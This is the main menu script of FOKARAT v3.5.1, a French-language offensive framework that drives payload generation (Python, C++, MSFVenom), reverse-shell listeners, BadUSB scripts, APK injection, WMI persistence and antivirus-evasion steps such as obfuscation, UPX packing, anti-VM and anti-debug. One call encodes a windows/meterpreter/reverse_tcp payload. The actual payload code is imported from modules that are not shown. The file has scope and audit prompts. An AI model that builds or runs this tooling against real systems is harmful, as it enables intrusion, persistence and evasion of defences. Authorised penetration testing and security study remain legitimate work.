#!/usr/bin/env python3
"""
FOKARAT v3.5.1 - Framework de cybersécurité
Corrections de sécurité : scope appliqué partout, API sécurisée.
"""
import os
import sys
import time
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.config import Config
from core.logger import Logger
from core.utils import which
from core.database import Database
from core.scope import ScopeValidator
from core.ethics import EthicsController
from core.plugin_loader import PluginLoader
from core.mitre import MitreMapper
from core.crypto import CryptoManager
from core.sandbox import Sandbox
from sdk.plugin_base import ScopeError

from modules.payload_generators.python_gen import PythonPayloadGenerator
from modules.payload_generators.cpp_gen import CppPayloadGenerator
from modules.payload_generators.msfvenom_gen import MsfvenomGenerator
from modules.listeners.listener_manager import ListenerManager
from modules.injectors.badusb_gen import BadUSBGenerator
from modules.injectors.duck_encoder import DuckEncoder
from modules.injectors.usb_flasher import USBFlasher
from modules.injectors.http_server import HTTPServer
from modules.android.apk_injector import ApkInjector
from modules.persistence.wmi_persist import WMIPersistence
from modules.evasion.payload_padding import PaddingGenerator
from modules.evasion.python_obfuscator import PythonObfuscator
from modules.evasion.upx_packer import UPXPacker
from modules.evasion.multi_encoder import MultiEncoder
from modules.evasion.anti_vm import AntiVMGenerator
from modules.evasion.anti_debug import AntiDebugGenerator


logger = Logger()
config = Config()
listener = ListenerManager()
http_server = HTTPServer()
db = Database()
scope_validator = ScopeValidator()
ethics = EthicsController()
plugin_loader = PluginLoader()
mitre = MitreMapper()
crypto = CryptoManager()
sandbox = Sandbox()


class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
    WHT = "\033[97m"; PNK = "\033[38;5;213m"


BANNER = f"""{C.GRN}{C.B}
   ███████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ████████╗
   ██╔════╝██╔═══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
   █████╗  ██║   ██║█████╔╝ ███████║██████╔╝███████║   ██║
   ██╔══╝  ██║   ██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║
   ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║
   ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {C.R}
{C.CYN}{C.B}              Building the future, one tool at a time.{C.R}
{C.YEL}                    FOKARAT Framework v3.5.1{C.R}
"""


BOOT_SEQUENCE = [
    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.05),
    ("[BOOT 02] Chargement des modules payloads...", 0.05),
    ("[BOOT 03] Chargement des listeners...", 0.05),
    ("[BOOT 04] Chargement des modules Android...", 0.05),
    ("[BOOT 05] Chargement des modules d'évasion...", 0.05),
    ("[BOOT 06] Initialisation de la base de données...", 0.05),
    ("[BOOT 07] Chargement du contrôleur éthique...", 0.05),
    ("[BOOT 08] Validation du scope...", 0.05),
    ("[BOOT 09] Chargement du système de plugins...", 0.05),
    ("[BOOT 10] Chargement du mapper MITRE...", 0.05),
    ("[BOOT 11] Initialisation du chiffrement AES...", 0.05),
    ("[BOOT 12] Initialisation du sandbox...", 0.05),
    ("[BOOT 13] Vérification des dépendances...", 0.10),
    ("[BOOT 14] Système prêt.", 0.15),
]


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def typewriter(text, delay=0.008, color=C.WHT):
    for char in text:
        sys.stdout.write(f"{color}{char}{C.R}")
        sys.stdout.flush()
        time.sleep(delay)
    print()


def spinner(duration=0.6, message="Chargement", color=C.CYN):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r  {color}{frames[i % len(frames)]}{C.R} {message}...")
        sys.stdout.flush()
        time.sleep(0.06)
        i += 1
    sys.stdout.write("\r" + " " * (len(message) + 15) + "\r")


def progress_bar(duration=0.6, width=40, color=C.GRN):
    sys.stdout.write("  ")
    for i in range(width + 1):
        pct = int(i / width * 100)
        sys.stdout.write(f"\r  {color}{'█' * i}{C.D}{'░' * (width - i)}{C.R} {C.B}{pct:3d}%{C.R}")
        sys.stdout.flush()
        time.sleep(duration / width)
    print()


def boot_animation():
    clear()
    print()
    for msg, delay in BOOT_SEQUENCE:
        typewriter(f"  {C.YEL}{msg}{C.R}", delay=0.003)
        time.sleep(delay)
    print()
    progress_bar(0.6, 50, C.CYN)
    time.sleep(0.2)


def animated_banner():
    clear()
    print()
    for line in BANNER.split("\n"):
        print(f"  {line}")
        time.sleep(0.015)
    print()


def separator(char="═", length=62, color=C.CYN):
    return f"{color}{char * length}{C.R}"


def menu_option(key, label, color=C.WHT):
    return f"  {C.YEL}│{C.R}  {C.GRN}[{key}]{C.R}  {color}{label}{C.R}"


def show_menu():
    clear()
    animated_banner()

    lhost = config.get("lhost") or f"{C.RED}(non défini){C.R}"
    lport = config.get("lport")
    scope_status = f"{C.GRN}✓{C.R}" if scope_validator.active_scope else f"{C.RED}✗{C.R}"
    dry_status = f"{C.YEL}ON{C.R}" if ethics.dry_run else f"{C.D}OFF{C.R}"
    plugins_count = len(plugin_loader.plugins)

    print(f"  {C.MAG}◆{C.R} LHOST:{C.CYN}{lhost}{C.R}  "
          f"{C.MAG}◆{C.R} LPORT:{C.CYN}{lport}{C.R}  "
          f"{C.MAG}◆{C.R} Scope:{scope_status}  "
          f"{C.MAG}◆{C.R} DRY:{dry_status}  "
          f"{C.MAG}◆{C.R} Plugins:{C.CYN}{plugins_count}{C.R}")
    print()
    print(separator("═", 62, C.CYN))

    print(f"  {C.B}{C.MAG}▶ PAYLOADS{C.R}")
    print(menu_option("01", "Payload Python"))
    print(menu_option("02", "Payload C++ (Mingw)"))
    print(menu_option("03", "Payload MSFVenom"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ LISTENERS{C.R}")
    print(menu_option("04", "Listener ncat"))
    print(menu_option("05", "Listener Metasploit"))
    print(menu_option("06", "Arrêter les listeners", C.RED))
    print(menu_option("07", "Serveur HTTP"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ BADUSB{C.R}")
    print(menu_option("08", "Générer DuckyScript"))
    print(menu_option("09", "Encoder .duck → .bin"))
    print(menu_option("10", "Flasher USB"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ ATTAQUES{C.R}")
    print(menu_option("11", "APK Injector"))
    print(menu_option("12", "Persistance WMI"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.RED}▶ ÉVASION{C.R}")
    print(menu_option("20", "Padding aléatoire C++"))
    print(menu_option("21", "Obfuscation Python"))
    print(menu_option("22", "Compression UPX"))
    print(menu_option("23", "Multi-encodage MSFVenom"))
    print(menu_option("24", "Anti-VM"))
    print(menu_option("25", "Anti-Debug"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.PNK}▶ PLUGINS{C.R}")
    print(menu_option("40", f"Lister les plugins ({plugins_count})"))
    print(menu_option("41", "Exécuter un plugin"))
    print(menu_option("42", "Recharger les plugins"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.CYN}▶ RAPPORTS{C.R}")
    print(menu_option("26", "Rapport d'opérations"))
    print(menu_option("33", "Rapport MITRE ATT&CK"))
    print(menu_option("34", "Export MITRE Navigator"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.YEL}▶ SÉCURITÉ{C.R}")
    print(menu_option("50", "Chiffrer fichier AES-256"))
    print(menu_option("51", "Déchiffrer fichier"))
    print(menu_option("52", "Tester sandbox"))
    print(menu_option("53", "Token JWT API"))
    print(menu_option("54", "Ajouter webhook SIEM"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.RED}▶ ÉTHIQUE & LÉGAL{C.R}")
    print(menu_option("30", "Déclarer un scope"))
    print(menu_option("31", "Activer/Désactiver DRY-RUN"))
    print(menu_option("32", "Journal d'audit"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ DIVERS{C.R}")
    print(menu_option("14", "Configuration LHOST/LPORT"))
    print(menu_option("15", "Sauvegarder config"))
    print(menu_option("16", "Ouvrir msfconsole"))
    print(menu_option("17", "Vérifier dépendances"))
    print(menu_option("27", "Lancer API Web"))
    print(menu_option("18", "Crédits"))
    print(menu_option("19", "Quitter", C.RED))

    print(separator("═", 62, C.CYN))
    print()


def check_dependencies():
    clear()
    animated_banner()
    print(f"  {C.B}{C.CYN}═══ DÉPENDANCES ═══{C.R}\n")
    deps = {
        "python3": "Python", "pip": "pip", "git": "Git",
        "g++": "C++", "x86_64-w64-mingw32-g++": "Mingw64",
        "msfvenom": "MSFVenom", "msfconsole": "MSFConsole",
        "ncat": "ncat", "apktool": "APKTool", "jarsigner": "Jarsigner",
        "zipalign": "ZipAlign", "keytool": "KeyTool", "java": "Java",
        "upx": "UPX", "pyinstaller": "PyInstaller",
    }
    missing = []
    for cmd, desc in deps.items():
        if which(cmd):
            print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
        else:
            print(f"  {C.RED}[✗]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
            missing.append(cmd)
    print()
    if missing:
        logger.warning(f"{len(missing)} outil(s) manquant(s).")
    else:
        logger.success("Toutes les dépendances présentes.")
    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


def handle_padding():
    path = input(f"  {C.YEL}.c à protéger :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, encoding="utf-8") as f:
        code = f.read()
    out = path.replace(".c", "_protected.c")
    with open(out, "w", encoding="utf-8") as f:
        f.write(PaddingGenerator().wrap_payload(code, 8, 15))
    logger.success(f"Protégé : {out}")
    ethics.audit("PADDING_APPLIED", out)


def handle_python_obfuscation():
    path = input(f"  {C.YEL}.py à obfusquer :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, encoding="utf-8") as f:
        code = f.read()
    out = path.replace(".py", "_obf.py")
    with open(out, "w", encoding="utf-8") as f:
        f.write(PythonObfuscator().obfuscate(code))
    logger.success(f"Obfusqué : {out}")
    ethics.audit("PYTHON_OBFUSCATED", out)


def handle_upx():
    path = input(f"  {C.YEL}Binaire :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Introuvable.")
        return
    UPXPacker().pack(path, True)
    ethics.audit("UPX_PACKED", path)


def handle_multi_encoder():
    MultiEncoder().list_encoders()
    key = input(f"  {C.YEL}Choix [1] :{C.R} ").strip() or "1"
    lhost = input(f"  {C.YEL}LHOST :{C.R} ").strip()
    if not lhost:
        logger.error("LHOST obligatoire.")
        return
    try:
        lport = int(input(f"  {C.YEL}LPORT :{C.R} ").strip())
        iters = int(input(f"  {C.YEL}Itérations [5] :{C.R} ").strip() or "5")
    except ValueError:
        logger.error("Invalide.")
        return
    out = os.path.join(config.get("output_dir", "output"), f"payload_enc_{key}.exe")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    MultiEncoder().encode("windows/meterpreter/reverse_tcp", lhost, lport, out, key, iters)


def handle_anti_vm():
    path = input(f"  {C.YEL}.c :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Introuvable.")
        return
    with open(path) as f:
        code = f.read()
    out = path.replace(".c", "_antivm.c")
    with open(out, "w") as f:
        f.write(AntiVMGenerator().wrap_with_anti_vm(code))
    logger.success(f"Anti-VM : {out}")


def handle_anti_debug():
    path = input(f"  {C.YEL}.c :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Introuvable.")
        return
    with open(path) as f:
        code = f.read()
    out = path.replace(".c", "_antidbg.c")
    with open(out, "w") as f:
        f.write(AntiDebugGenerator().wrap(code))
    logger.success(f"Anti-Debug : {out}")


def handle_report():
    path = db.export_report()
    print(f"\n  {C.GRN}Rapport : {path}{C.R}\n")
    with open(path) as f:
        print(f.read())


def handle_mitre_report():
    audit_file = "output/audit.log"
    if not os.path.exists(audit_file):
        logger.warning("Aucune action.")
        return
    action_map = {
        "PADDING_APPLIED": "padding", "PYTHON_OBFUSCATED": "obfuscation",
        "UPX_PACKED": "upx_pack", "MULTI_ENCODED": "multi_encoder",
        "ANTI_VM_APPLIED": "anti_vm", "ANTI_DEBUG_APPLIED": "anti_debug",
        "PAYLOAD_PYTHON": "python_execution", "PAYLOAD_CPP": "cmd_execution",
        "PAYLOAD_MSFVENOM": "reverse_shell", "LISTENER_NCAT": "reverse_shell",
        "LISTENER_MSF": "msf_handler", "BADUSB_GENERATED": "phishing_badusb",
        "WMI_PERSISTENCE": "wmi_persistence", "PLUGIN_EXECUTED": "port_scan",
    }
    actions = set()
    with open(audit_file) as f:
        for line in f:
            try:
                e = json.loads(line)
                if e.get("action") in action_map:
                    actions.add(action_map[e["action"]])
            except Exception:
                pass
    if not actions:
        logger.warning("Aucune action MITRE.")
        return
    content = mitre.generate_report(list(actions))
    out = "output/mitre_report.md"
    with open(out, "w", encoding="utf-8") as f:
        f.write(content)
    logger.success(f"Rapport MITRE : {out}")
    print(f"\n{content}\n")


def handle_mitre_navigator():
    audit_file = "output/audit.log"
    if not os.path.exists(audit_file):
        logger.warning("Aucune action.")
        return
    action_map = {
        "PADDING_APPLIED": "padding", "PYTHON_OBFUSCATED": "obfuscation",
        "UPX_PACKED": "upx_pack", "MULTI_ENCODED": "multi_encoder",
        "ANTI_VM_APPLIED": "anti_vm", "ANTI_DEBUG_APPLIED": "anti_debug",
        "PAYLOAD_MSFVENOM": "reverse_shell", "WMI_PERSISTENCE": "wmi_persistence",
    }
    actions = set()
    with open(audit_file) as f:
        for line in f:
            try:
                e = json.loads(line)
                if e.get("action") in action_map:
                    actions.add(action_map[e["action"]])
            except Exception:
                pass
    if not actions:
        logger.warning("Aucune action.")
        return
    out = "output/mitre_navigator.json"
    mitre.export_navigator_json(list(actions), out)


def handle_web_api():
    # Vérification des variables d'environnement AVANT lancement
    if not os.environ.get("FOKARAT_API_USER") or not os.environ.get("FOKARAT_API_PASS"):
        logger.error("Variables d'environnement manquantes.")
        print(f"\n  {C.YEL}Définissez avant de lancer :{C.R}")
        print(f"    {C.CYN}export FOKARAT_API_USER='admin'{C.R}")
        print(f"    {C.CYN}export FOKARAT_API_PASS='motdepasse_fort_12+'{C.R}\n")
        return

    logger.info("API sur http://localhost:5000/docs")
    ethics.audit("API_STARTED", "5000")
    try:
        from web.api import start_web
        start_web(host="127.0.0.1", port=5000)
    except ImportError:
        logger.error("pip install fastapi uvicorn python-jose")


def handle_scope():
    clear()
    existing = scope_validator.load_scope()
    if existing:
        print(f"  {C.YEL}Scope actif : {existing['target']}{C.R}")
        if input(f"  {C.YEL}Remplacer ? (o/n) :{C.R} ").strip().lower() != "o":
            return
    scope_validator.require_scope()


def handle_dry_run():
    if ethics.dry_run:
        ethics.disable_dry_run()
    else:
        ethics.enable_dry_run()


def handle_audit_log():
    clear()
    print(f"\n  {C.B}{C.CYN}═══ AUDIT ═══{C.R}\n")
    audit_file = "output/audit.log"
    if not os.path.exists(audit_file):
        logger.info("Aucun log.")
        return
    with open(audit_file) as f:
        lines = f.readlines()
    print(f"  {C.D}{len(lines)} entrée(s){C.R}\n")
    for line in lines[-30:]:
        try:
            e = json.loads(line)
            print(f"  [{e['timestamp'][:19]}] {e['action']} : {e.get('details', '')}")
        except Exception:
            pass


def handle_list_plugins():
    clear()
    print(f"\n  {C.B}{C.PNK}═══ PLUGINS ═══{C.R}\n")
    plugins = plugin_loader.list_plugins()
    if not plugins:
        logger.info("Aucun plugin.")
        return
    for i, p in enumerate(plugins, 1):
        m = p.metadata
        scope_req = f" {C.YEL}[scope requis]{C.R}" if m.requires_scope else ""
        print(f"  {C.CYN}[{i}]{C.R} {C.B}{m.name}{C.R} v{m.version} ({m.category}){scope_req}")
        print(f"      {C.D}{m.description}{C.R}\n")


def handle_run_plugin():
    plugins = plugin_loader.list_plugins()
    if not plugins:
        logger.info("Aucun plugin.")
        return
    for i, p in enumerate(plugins, 1):
        req = " [scope]" if p.metadata.requires_scope else ""
        print(f"    [{i}] {p.metadata.name}{req}")
    try:
        c = int(input(f"  {C.YEL}Choix :{C.R} ").strip())
        plugin = plugins[c - 1]
    except (ValueError, IndexError):
        logger.error("Invalide.")
        return

    # Construit les args
    args = {}
    if plugin.metadata.requires_scope:
        target = input(f"  {C.YEL}Cible (target) :{C.R} ").strip()
        args["target"] = target
        ports = input(f"  {C.YEL}Ports (top/1-1024/22,80,443) [top] :{C.R} ").strip() or "top"
        args["ports"] = ports

    # Confirmation éthique
    if not ethics.confirm_action(f"Exécuter {plugin.metadata.name}"):
        return

    try:
        result = plugin.run(config, args=args if args else None)
        logger.success(f"Résultat : {result}")
        ethics.audit("PLUGIN_EXECUTED", plugin.metadata.name)
    except ScopeError as e:
        logger.error(f"❌ SCOPE REFUSÉ : {e}")
        ethics.audit("SCOPE_DENIED", str(e))
    except Exception as e:
        logger.error(f"Erreur : {e}")


def handle_reload_plugins():
    plugin_loader.unload_all()
    n = plugin_loader.load_all()
    logger.success(f"{n} plugin(s) rechargé(s)")


def handle_encrypt_file():
    path = input(f"  {C.YEL}Fichier à chiffrer :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Introuvable.")
        return
    crypto.encrypt_file(path)
    ethics.audit("FILE_ENCRYPTED", path)


def handle_decrypt_file():
    path = input(f"  {C.YEL}Fichier .enc :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Introuvable.")
        return
    try:
        content = crypto.decrypt_file(path)
        out = path.replace(".enc", ".dec")
        with open(out, "w", encoding="utf-8") as f:
            f.write(content)
        logger.success(f"Déchiffré : {out}")
    except Exception as e:
        logger.error(f"Échec : {e}")


def handle_test_sandbox():
    print(f"\n  {C.YEL}Test sandbox :{C.R}")
    for k, v in sandbox.limits.items():
        print(f"    {k} = {v}")
    print()
    cmd = input(f"  {C.YEL}Commande [echo hello] :{C.R} ").strip() or "echo hello"
    print()
    result = sandbox.run(cmd)
    print(f"\n  Status : {result['status']} | Durée : {result['duration']}s | Code : {result['returncode']}")
    if result["stdout"]:
        print(f"  {C.GRN}Sortie :{C.R}\n{result['stdout'][:500]}")
    ethics.audit("SANDBOX_TEST", cmd)


def handle_jwt_token():
    try:
        from web.auth import jwt_manager
        user = os.environ.get("FOKARAT_API_USER")
        if not user:
            logger.error("FOKARAT_API_USER non défini.")
            return
        token = jwt_manager.create_token(user, expiry=3600)
        print(f"\n  {C.GRN}Token JWT :{C.R}\n")
        print(f"  {C.CYN}{token}{C.R}\n")
    except ImportError as e:
        logger.error(f"Module auth indisponible : {e}")


def handle_webhook_add():
    try:
        from web.webhooks import webhook_manager
        url = input(f"  {C.YEL}URL webhook :{C.R} ").strip()
        if url:
            webhook_manager.add_hook(url)
            ethics.audit("WEBHOOK_ADDED", url)
    except ImportError as e:
        logger.error(f"Module webhooks indisponible : {e}")


def main():
    boot_animation()
    time.sleep(0.3)
    scope_validator.load_scope()
    plugin_loader.load_all()

    while True:
        show_menu()
        choice = input(f"  {C.B}{C.MAG}╰─▶{C.R} {C.B}FOKARAT{C.R} {C.YEL}>{C.R} ").strip()

        try:
            if choice == "01":
                if ethics.confirm_action("Payload Python"):
                    PythonPayloadGenerator().run(config)
            elif choice == "02":
                if ethics.confirm_action("Payload C++"):
                    CppPayloadGenerator().run(config)
            elif choice == "03":
                if ethics.confirm_action("Payload MSFVenom"):
                    MsfvenomGenerator().run(config)
            elif choice == "04":
                listener.start_ncat(config)
            elif choice == "05":
                listener.start_msf(config)
            elif choice == "06":
                listener.stop_all()
            elif choice == "07":
                http_server.run(config); continue
            elif choice == "08":
                if ethics.confirm_action("DuckyScript"):
                    BadUSBGenerator().run(config)
            elif choice == "09":
                DuckEncoder().run(config)
            elif choice == "10":
                if ethics.confirm_action("Flash USB"):
                    USBFlasher().run(config)
            elif choice == "11":
                if ethics.confirm_action("APK Injector"):
                    ApkInjector().run(config)
            elif choice == "12":
                if ethics.confirm_action("WMI"):
                    WMIPersistence().run(config)
            elif choice == "14":
                ip = input(f"  LHOST [{config.get('lhost')}] : ").strip()
                if ip: config.set("lhost", ip)
                p = input(f"  LPORT [{config.get('lport')}] : ").strip()
                if p.isdigit(): config.set("lport", int(p))
                logger.success("Config mise à jour.")
            elif choice == "15":
                if config.save(): logger.success("Sauvegardée.")
            elif choice == "16":
                if which("msfconsole"): os.system("msfconsole")
                else: logger.error("msfconsole absent.")
            elif choice == "17":
                check_dependencies(); continue
            elif choice == "18":
                clear(); animated_banner()
                print(f"  {C.B}{C.GRN}FOKARAT v3.5.1{C.R}")
                print(f"  Lwano Amissi Blanchard (FOKAS) — Bukavu, RDC\n")
            elif choice == "19":
                listener.stop_all(); plugin_loader.unload_all()
                typewriter(f"\n  {C.GRN}À bientôt !{C.R}", 0.02); print(); break

            elif choice == "20": handle_padding()
            elif choice == "21": handle_python_obfuscation()
            elif choice == "22": handle_upx()
            elif choice == "23": handle_multi_encoder()
            elif choice == "24": handle_anti_vm()
            elif choice == "25": handle_anti_debug()
            elif choice == "26": handle_report()
            elif choice == "27": handle_web_api(); continue

            elif choice == "30": handle_scope()
            elif choice == "31": handle_dry_run()
            elif choice == "32": handle_audit_log()

            elif choice == "33": handle_mitre_report()
            elif choice == "34": handle_mitre_navigator()

            elif choice == "40": handle_list_plugins()
            elif choice == "41": handle_run_plugin()
            elif choice == "42": handle_reload_plugins()

            elif choice == "50": handle_encrypt_file()
            elif choice == "51": handle_decrypt_file()
            elif choice == "52": handle_test_sandbox()
            elif choice == "53": handle_jwt_token()
            elif choice == "54": handle_webhook_add()

            else:
                logger.warning("Choix invalide.")

        except KeyboardInterrupt:
            print(); logger.warning("Interrompu.")
        except Exception as e:
            logger.error(f"Erreur : {e}")

        input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        listener.stop_all()
        plugin_loader.unload_all()
        print(f"\n{C.RED}[!] Sortie.{C.R}")